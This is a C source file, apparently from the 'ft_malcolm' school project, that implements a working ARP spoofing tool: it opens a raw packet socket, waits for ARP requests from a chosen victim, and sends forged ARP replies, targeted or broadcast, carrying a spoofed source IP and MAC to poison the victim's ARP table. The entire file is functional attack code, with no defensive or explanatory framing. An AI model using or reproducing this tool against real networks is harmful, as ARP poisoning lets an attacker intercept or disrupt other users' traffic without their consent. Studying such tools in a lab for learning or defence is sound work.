#include "ft_malcolm.h"

static int confirm_arp_packet(char* buffer) {
	if (buffer) {
		struct ethhdr *eth = (struct ethhdr *)buffer;
		if (ntohs(eth->h_proto) == ETH_P_ARP) 
			return 1;
	}
	return 0;

}

static struct arp_packet *process_arp_struct(char buffer[2000]) {
	struct arp_packet *arp = ft_calloc(sizeof(struct arp_packet), 1);
	if (!arp) {
		printf("Failed to create ARP packet struct!\n");
		return NULL;
	}
	ft_memcpy(arp, buffer + sizeof(struct ethhdr), sizeof(struct arp_packet));
	if (arp)
		return arp;
	return NULL;
}

static void print_hex_dump(const struct ether_arp *arp, 
							   const struct ether_header *eth) {
	int total_len = sizeof(struct ether_header) + sizeof(struct ether_arp); // 14 + 28 bytes...
	unsigned char* buffer = ft_calloc(sizeof(char), total_len);
	if (!buffer) {
		prepare_for_exit(ENOMEM, "Error trying to print packet information...");
		return ;
	}
	printf("[PRINTING PACKET PAYLOAD]\n");
	printf("----------------------------\n");
	
	ft_memcpy(buffer, eth, sizeof(struct ether_header));
	ft_memcpy(buffer + sizeof(struct ether_header), arp, sizeof(struct ether_arp));

	for (int i = 0; i < total_len; i++) {
		if (i !=0 && i % 16 == 0)
			printf("\n");

		printf("%02x", buffer[i]);
		if (i % 2 != 0)
			printf(" ");
	}
	free(buffer);
	printf("\n----------------------------\n");
}


void target_victim(int packet_socket,  t_info* info, int targetMode) {
	if (info->stopProgram)
		return ;
 
	unsigned char frame[42];
	struct ether_header *eth = (struct ether_header *)frame;
	struct ether_arp *payload = (struct ether_arp *)(frame + sizeof(struct ether_header));

	if (targetMode)
		printf("[Target Mode]\n");
	else 
		printf("[Broadcast Mode]\n");

	payload->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);  
	payload->ea_hdr.ar_pro = htons(ETH_P_IP);   
	payload->ea_hdr.ar_hln = ETH_ALEN;            
	payload->ea_hdr.ar_pln = 4;                   
	payload->ea_hdr.ar_op = htons(ARPOP_REPLY);  

	if (targetMode) {
		for (int i = 0; i < 6; i++) {
			eth->ether_dhost[i] = info->target_mac[i];
			eth->ether_shost[i] = info->source_mac[i];
		}
	}
   
	if (!targetMode) // i.e broadcast mode executed
	 for (int i = 0; i < 6; i++) {
		eth->ether_dhost[i] = 0xff;
		eth->ether_shost[i] = info->source_mac[i];
	}

	eth->ether_type = htons(ETH_P_ARP);

	ft_memcpy(payload->arp_spa, info->source_ip, 4);
	ft_memcpy(payload->arp_sha,info->source_mac, ETH_ALEN); 

	if (targetMode) {
		ft_memcpy(payload->arp_tha,info->target_mac, ETH_ALEN); 
		ft_memcpy(payload->arp_tpa, info->target_ip, 4);
	}

	if (!targetMode) {
		ft_memcpy(payload->arp_tha, "\xff\xff\xff\xff\xff\xff", ETH_ALEN);  
		ft_memcpy(payload->arp_tpa, info->source_ip, 4); 
	}

	struct sockaddr_ll device = {0};
	device.sll_family = AF_PACKET;
	device.sll_protocol = htons(ETH_P_ARP);
	device.sll_ifindex = if_nametoindex(info->nicName); 
	ft_memcpy(device.sll_addr, eth->ether_dhost, ETH_ALEN);
	device.sll_halen = ETH_ALEN;

	if (sendto(packet_socket, frame, 42, 0, (struct sockaddr*)&device, sizeof(device)) == -1)
		prepare_for_exit(EBADF,"Unable to send ARP packet...Exiting...");
	else {
		printf("Sending an ARP to the target address with spoofed source, please wait...\n");
		if (info->verboseFlag) {
			print_hex_dump(payload, eth);
		}
		printf("Sent an ARP reply packet, you may now check the arp table on the target.\n");
	}

}

static void poison_victim(int packet_socket,  t_info* info) {
	if (info->stopProgram)
		return ;
	unsigned char frame[42];
	struct ether_header *eth = (struct ether_header *)frame;
	struct ether_arp *payload = (struct ether_arp *)(frame + sizeof(struct ether_header));

	payload->ea_hdr.ar_hrd = htons(ARPHRD_ETHER); // HW TYPE ETHERNET - ie tells system we are dealing with MAC type addresses, so how to read and store them, map them
	payload->ea_hdr.ar_pro = htons(ETH_P_IP);     // PROTOCOL IPV4 - ie dealing with IPV4 address formats
	payload->ea_hdr.ar_hln = ETH_ALEN;            // HW ADDRESS LEN
	payload->ea_hdr.ar_pln = 4;                   // PROTOCOL ADDR LEN
	payload->ea_hdr.ar_op = htons(ARPOP_REPLY);   // OP CODE (Reply vs Req)

	for (int i = 0; i < 6; i++) {
		eth->ether_dhost[i] = info->target_mac[i];
		eth->ether_shost[i] = info->source_mac[i];
	}

	eth->ether_type = htons(ETH_P_ARP);

	ft_memcpy(payload->arp_spa, info->source_ip, 4);
	ft_memcpy(payload->arp_sha,info->source_mac, ETH_ALEN);
	ft_memcpy(payload->arp_tha,info->target_mac, ETH_ALEN); 
	ft_memcpy(payload->arp_tpa, info->target_ip, 4);

	struct sockaddr_ll device = {0};
	device.sll_family = AF_PACKET;
	device.sll_protocol = htons(ETH_P_ARP);
	device.sll_ifindex = if_nametoindex(info->nicName); 
	ft_memcpy(device.sll_addr, eth->ether_dhost, ETH_ALEN);
	device.sll_halen = ETH_ALEN;
	

	if (sendto(packet_socket, frame, 42, 0, (struct sockaddr*)&device, sizeof(device)) == -1)
		prepare_for_exit(EBADF,"Unable to send ARP packet...Exiting...");
	else {
		printf("Now sending an ARP reply to the target address with spoofed source, please wait...\n");
		if (info->verboseFlag) {
			print_hex_dump(payload, eth);
		}
		printf("Sent an ARP reply packet, you may now check the arp table on the target.\n");
	}
}


int check_source_matches_target(t_info* info, struct arp_packet *arp) {
	for (int i = 0; i < 4; i++) {
		if (info->source_ip[i] != arp->target_ip[i]) {
			if (info->verboseFlag)
				printf("ARP Request from victim received for [%d.%d.%d.%d] ignored.\nTarget for poison set as [%s]\n", 
					arp->target_ip[0], arp->target_ip[1], arp->target_ip[2], arp->target_ip[3], info->sourceIP);
			return (0);
		}
	}
	return (1);
}


int check_target_match(t_info* info, struct arp_packet *arp) {

	for (int i = 0; i < 4; i++) {
		if (info->target_ip[i] != arp->sender_ip[i])
			return (0);
	}
	
	if (!info->targetMaskedMac) {
		for (int i = 0; i < 6; i++) {
			if (info->target_mac[i] != arp->sender_mac[i]) {			
				if (info->verboseFlag)
					printf("Request received from target victim but MAC address of target victim and your config are different...\n");
				return (0);
			}
		}
	} else {
		for (int i = 0; i < 6; i++) {
			if (info->target_mac[i] == 42) {
				info->target_mac[i] = arp->sender_mac[i];
			} else if (info->target_mac[i] != arp->sender_mac[i]) {			
				if (info->verboseFlag)
					printf("Request received from target victim but MAC address of target victim and your config are different...\n");
				return (0);
			}
		}
	}

	return (1);
}

static void inform(t_info* info) {
		printf("A matching ARP request has been broadcast\n");
		printf("\tIP address of request   [%s]\n", info->targetIP);
		printf("\tMAC address of request  [");
		for (int i = 0; i < 5; i++)
			printf("%02x:", info->target_mac[i]);
		printf("%02x]", info->target_mac[5]);
		printf("\n");
}

static int bind_to_interface(t_info* info, int socket_fd) {
	struct sockaddr_ll sll;
	ft_memset(&sll, 0, sizeof(sll));

	sll.sll_ifindex = if_nametoindex(info->nicName);

	if (sll.sll_ifindex == 0)
		return -1;

	sll.sll_family = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_ALL);

	if (bind(socket_fd, (struct sockaddr *) &sll, sizeof(sll)) < 0)
		return -1;

	return 0;
}


void    poison_arp(t_info* info) {
	char buffer[2000];
	int is_arp = 0;
	struct arp_packet *arp = NULL;
	int packet_socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

	if (packet_socket == -1) {
		prepare_for_exit(errno, "Failed to create socket");
		return ;
	}
	
	if (info->interfaceFlag) {
		if (bind_to_interface(info, packet_socket) == -1) {
			prepare_for_exit(errno, "Failed to bind to NIC");
			return ;
		}
		if (info->verboseFlag)
			printf("Binding to interface '%s'\n", info->nicName);
	}

	if (info->verboseFlag)
		printf("Socket created\nListening for ARP Packets...\n");
	if (info->targetFlag)
		target_victim(packet_socket, info, 1);
	if (info->broadcastFlag) 
		target_victim(packet_socket, info, 0);

	if (!(info->broadcastFlag || info->targetFlag)) { 
		printf("Listening for target to poison...\n");
		while(1) {
			if (info->stopProgram)
				return ;
			int data_size = recvfrom(packet_socket, buffer, sizeof(buffer), 0, NULL, NULL);
			if (data_size == -1) {
				if ((errno != EINTR || errno != EAGAIN || errno != EWOULDBLOCK) && !info->stopProgram)
					prepare_for_exit(EBADF,"Fatal Error while listening on socket...");
			} 
			if (data_size > 0 && !info->stopProgram) {
				is_arp = confirm_arp_packet(buffer);
				if (is_arp) {
					arp = process_arp_struct(buffer);
					if (!arp) {
						prepare_for_exit(ENOMEM,"Unable to create arp struct...Exiting...");
						return ;
					}
					if (info->verboseFlag)
						printf("ARP Packet received from [%d.%d.%d.%d]...checking if target match...\n",
							arp->sender_ip[0], arp->sender_ip[1], arp->sender_ip[2], arp->sender_ip[3]);
					if (check_target_match(info, arp) && check_source_matches_target(info, arp)) {
							inform(info);
							poison_victim(packet_socket, info);
							free(arp);
							return;
					} else {
						free(arp);
						if (info->verboseFlag)
							printf("ARP Packet not targetted...ignoring...\n");
					}
				}
				is_arp = 0;
			}
		}
	}
}




